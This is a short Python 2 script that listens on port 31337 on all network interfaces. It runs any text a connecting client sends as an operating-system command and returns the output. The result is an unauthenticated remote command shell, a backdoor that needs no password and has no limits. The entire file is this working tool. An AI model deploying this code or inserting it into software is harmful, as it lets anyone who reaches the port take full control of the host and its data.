#!/usr/bin/env python


import SocketServer, os
from threading import Thread

class service(SocketServer.BaseRequestHandler):
    def handle(self):
        # self.request is the TCP socket connected to the client
        self.data = self.request.recv(1024).strip()
        #print "{} wrote:".format(self.client_address[0])
        #print self.data
        # exec os command and return result
        result = os.popen(self.data+" 2>&1").read()
        self.request.sendall(result)
        self.request.close()



class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

t = ThreadedTCPServer(('0.0.0.0',31337), service)
t.serve_forever()
